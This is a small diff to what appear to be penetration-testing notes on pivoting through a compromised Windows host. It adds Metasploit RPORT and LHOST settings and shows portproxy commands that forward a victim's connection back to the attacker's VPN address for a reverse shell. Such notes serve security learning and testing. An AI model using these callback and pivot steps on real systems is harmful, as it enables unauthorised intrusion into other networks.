@@ -950,6 +950,10 @@ Now turn on the proxy in the web browser config to the VPN Tunnel address with t
 Browse like normal
 
 NOW TO GET THE MACHINE TO BE ABLE TO CONNECT BACK TO US
+
+modify the default RPORT option to be that of the TCP port 8443
+LHOST to be that of the pivot machine's external IP 172.16.80.100
+
 use post/windows/manage/portproxy
 msf post(windows/manage/portproxy) > set CONNECT_ADDRESS 175.12.80.21 (My VPN)
 msf post(windows/manage/portproxy) > set CONNECT_PORT 4444 (Whatever)
